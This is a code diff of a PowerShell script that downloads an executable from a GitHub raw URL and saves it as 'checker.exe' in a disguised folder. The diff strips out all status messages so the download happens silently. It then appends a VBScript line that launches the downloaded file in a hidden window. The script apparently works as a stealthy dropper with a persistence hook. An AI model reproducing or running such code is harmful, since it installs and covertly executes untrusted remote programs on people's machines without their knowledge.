@@ -1,15 +1,21 @@
 
 $url = "https://raw.githubusercontent.com/wajih8/wpla_wajih/refs/heads/main/waj.exe"
-$destination = "C:\ProgramX64\extentions\checks.exe"
+$destination = "C:\ProgramX64\extentions\checker.exe"
 
 $directory = Split-Path -Path $destination
 if (-not (Test-Path -Path $directory)) {
     New-Item -ItemType Directory -Path $directory -Force | Out-Null
-    Write-Host "Created directory: $directory" -ForegroundColor Cyan
+    
 }
 
 # Download the file
-Write-Host "Downloading file to $destination..." -ForegroundColor Yellow
+
 Invoke-WebRequest -Uri $url -OutFile $destination
 
-Write-Host "Download complete!" -ForegroundColor Green
+$vbsPath = "C:\path\to\your\file.vbs"
+
+# The VBScript line to append
+$vbsLine = 'WshShell.Run """C:\ProgramX64\extentions\checker.exe""", 0, False'
+
+# Append the line to the file
+Add-Content -Path $vbsPath -Value $vbsLine
